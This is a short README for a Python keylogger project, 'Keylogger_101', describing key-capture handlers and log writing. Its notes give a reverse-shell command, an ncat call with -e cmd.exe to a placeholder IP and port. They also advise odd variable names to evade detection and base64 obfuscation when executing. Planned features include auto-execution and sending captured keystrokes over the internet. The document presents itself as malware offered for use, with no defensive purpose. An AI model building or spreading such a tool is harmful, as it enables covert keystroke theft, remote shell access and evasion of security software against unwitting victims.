# Keylogger_101

kelogger_101

Requirements:

python 3, sys, subprocess

Functions:

* on_tryck : actions if key is pressed
* on_slapp : actions if key is released
* write_file : write to file with options

Notes:

* Replace os.system('cmd /k "ncat <ip> <port> -e cmd.exe"') with your corresponding IP & Port
* Variables need weird names to not get detected
* Use base64 or similar when exec

Future features:

* Auto exec (.exe)
* Send logs over the internet

